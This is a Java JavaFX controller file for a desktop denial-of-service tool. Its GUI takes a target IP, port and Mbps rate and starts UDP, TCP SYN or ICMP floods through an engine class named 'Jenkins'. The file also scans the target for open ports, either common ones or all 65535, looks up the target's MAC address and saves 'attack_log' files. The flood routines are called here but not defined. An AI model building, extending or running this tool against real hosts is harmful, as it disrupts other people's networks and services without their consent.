package com.yourpackage;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.nio.file.Files;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Optional;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.layout.HBox;
import javafx.stage.FileChooser;
import javafx.stage.Stage;

public class MainController {
    private Jenkins jenkinsTool;

    @FXML private TextField ipAddressField;
    @FXML private TextField portField;
    @FXML private TextField mbpsField;
    @FXML private TextField macAddressField;
    @FXML private ComboBox<String> attackTypeComboBox;
    @FXML private Button startButton;
    @FXML private Button stopButton;
    @FXML private Button pingButton;
    @FXML private Button getMacButton;
    @FXML private Label statusLabel;
    @FXML private TextArea logArea;
    @FXML private Button findOpenPortButton;

    @FXML private HBox rateBox;
    private boolean isMbps = true;

    @FXML private TextField sourceIpField;
    @FXML private TextField sourceMacField;
    @FXML private Button loadSourceInfoButton;

    private boolean logSaved = true;

    @FXML
    public void initialize() {
        // Initialize components
        attackTypeComboBox.getItems().addAll("UDP Flood", "TCP SYN Flood", "ICMP Flood");
        stopButton.setDisable(true);

        jenkinsTool = new Jenkins();
        jenkinsTool.setLogArea(logArea);
        
        // Set window size
        Platform.runLater(() -> {
            Stage stage = (Stage) logArea.getScene().getWindow();
            stage.setWidth(800);  // Increased width
            stage.setHeight(700); // Increased height
            stage.setMinWidth(800);
            stage.setMinHeight(700);
        });
        
        // Initialize attack types
        attackTypeComboBox.setItems(FXCollections.observableArrayList(
            "UDP Flood", 
            "TCP SYN Flood", 
            "ICMP Flood"
        ));
        
        // Set a default selection
        attackTypeComboBox.setValue("UDP Flood");
    }

    @FXML
    public void pingTargetIP() {
        try {
            String ip = ipAddressField.getText();
            InetAddress address = InetAddress.getByName(ip);
            log("Pinging " + ip + "...");
            boolean reachable = address.isReachable(5000);
            String result = reachable ? "Ping successful" : "Ping failed";
            log(result);
            statusLabel.setText(result);
        } catch (Exception e) {
            log("Error: " + e.getMessage());
            statusLabel.setText("Error: " + e.getMessage());
        }
    }

    @FXML
    private void getMacAddress() {
        String targetIp = ipAddressField.getText();
        if (targetIp.isEmpty()) {
            log("Please enter a target IP address.");
            return;
        }
        try {
            String macAddress = jenkinsTool.getMacAddress(targetIp);
            if (macAddress != null && !macAddress.equals("MAC address not found") && !macAddress.startsWith("Error:")) {
                macAddressField.setText(macAddress);
                log("MAC address found: " + macAddress);
            } else {
                macAddressField.setText(macAddress);
                log("Unable to retrieve MAC address for " + targetIp + ": " + macAddress);
            }
        } catch (Exception e) {
            macAddressField.setText("Error retrieving MAC address");
            log("Error retrieving MAC address: " + e.getMessage());
        }
    }

    public void startAttack() {
        String attackType = attackTypeComboBox.getValue();
        if (attackType == null) {
            log("Please select an attack type");
            return;
        }

        // Validate other required fields
        if (ipAddressField.getText().isEmpty()) {
            log("Please enter a target IP address");
            return;
        }

        if (portField.getText().isEmpty()) {
            log("Please enter a target port");
            return;
        }

        if (mbpsField.getText().isEmpty()) {
            log("Please enter a target Mbps value");
            return;
        }

        long targetBytesPerSecond;
        try {
            targetBytesPerSecond = Long.parseLong(mbpsField.getText()) * 125000L; // Convert Mbps to bytes/sec
        } catch (NumberFormatException e) {
            log("Please enter a valid number for Mbps");
            return;
        }

        jenkinsTool.resetAttack();
        String targetIp = ipAddressField.getText();
        int targetPort = Integer.parseInt(portField.getText());

        switch (attackType) {
            case "UDP Flood":
                jenkinsTool.udpFlood(targetIp, targetPort, targetBytesPerSecond);
                break;
            case "TCP SYN Flood":
                jenkinsTool.tcpSynFlood(targetIp, targetPort, targetBytesPerSecond);
                break;
            case "ICMP Flood":
                jenkinsTool.icmpFlood(targetIp, targetBytesPerSecond);
                break;
            default:
                log("Unknown attack type selected: " + attackType);
                return;
        }

        Platform.runLater(() -> {
            startButton.setDisable(true);
            stopButton.setDisable(false);
            statusLabel.setText("Status: Attack Started");
            log("Attack started: " + attackType);
        });
    }

    @FXML
    public void stopAttack() {
        jenkinsTool.stopAttack();
        startButton.setDisable(false);
        stopButton.setDisable(true);
        statusLabel.setText("Status: Attack Stopped");
        log("Attack stopped");
    }

    @FXML
    public void findOpenPort() {
        String ip = ipAddressField.getText();
        log("Searching for open ports on " + ip);
        int[] commonPorts = {80, 443, 22, 21, 25, 3306, 8080, 1433, 3389, 5432};
        for (int port : commonPorts) {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress(ip, port), 100);
                portField.setText(String.valueOf(port));
                String message = "Open port found: " + port;
                log(message);
                statusLabel.setText(message);
                return;
            } catch (IOException e) {
                // Port is not open, continue to next
            }
        }
        String message = "No open ports found";
        log(message);
        statusLabel.setText(message);
    }

    private void log(String message) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss.SSS"));
        Platform.runLater(() -> {
            logArea.appendText(String.format("[%s] %s%n", timestamp, message));
            logSaved = false;
        });
    }

    @FXML
    private void saveLog() {
        FileChooser fileChooser = new FileChooser();
        fileChooser.setTitle("Save Log File");
        fileChooser.getExtensionFilters().add(
            new FileChooser.ExtensionFilter("Log Files", "*.log")
        );
        
        LocalDateTime now = LocalDateTime.now();
        String defaultFileName = String.format("attack_log_%s.log", 
            now.format(DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss")));
        fileChooser.setInitialFileName(defaultFileName);
        
        File file = fileChooser.showSaveDialog(logArea.getScene().getWindow());
        if (file != null) {
            try {
                Files.writeString(file.toPath(), logArea.getText());
                logSaved = true;
                log("Log saved to: " + file.getAbsolutePath());
            } catch (IOException e) {
                log("Error saving log: " + e.getMessage());
            }
        }
    }

    @FXML
    private void clearLog() {
        if (!logSaved) {
            Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
            alert.setTitle("Unsaved Log");
            alert.setHeaderText("The log has not been saved");
            alert.setContentText("Would you like to save the log before clearing?");
            
            ButtonType buttonTypeSave = new ButtonType("Save");
            Optional<ButtonType> result = alert.showAndWait();
            if (result.isPresent() && result.get() == buttonTypeSave) {
                saveLog();
            }
        }
        logArea.clear();
    }

    public void scanPorts(String targetIp) {
        log("Starting port scan on " + targetIp);
        for (int port = 1; port <= 65535; port++) {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress(targetIp, port), 100);
                String message = "Port " + port + " is open";
                log(message);
                statusLabel.setText(message);
            } catch (IOException e) {
                // Port is not open, continue to next
            }
        }
        String message = "Port scan completed";
        log(message);
        statusLabel.setText(message);
    }

    @FXML
    private void loadSourceInfo() {
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            String sourceIp = localHost.getHostAddress();
            sourceIpField.setText(sourceIp);

            NetworkInterface ni = NetworkInterface.getByInetAddress(localHost);
            byte[] hardwareAddress = ni.getHardwareAddress();
            String sourceMac = String.format("%02X:%02X:%02X:%02X:%02X:%02X", 
                hardwareAddress[0], hardwareAddress[1], hardwareAddress[2], 
                hardwareAddress[3], hardwareAddress[4], hardwareAddress[5]);
            sourceMacField.setText(sourceMac);

            // Update the Jenkins class with the new source information
            jenkinsTool.setSourceIp(sourceIp);
            jenkinsTool.setSourceMac(hardwareAddress);

            log("Source information loaded successfully.");
        } catch (Exception e) {
            log("Error loading source information: " + e.getMessage());
        }
    }

    // Add this method to handle application shutdown
    public void shutdown() {
        jenkinsTool.stopAttack();
    }
}
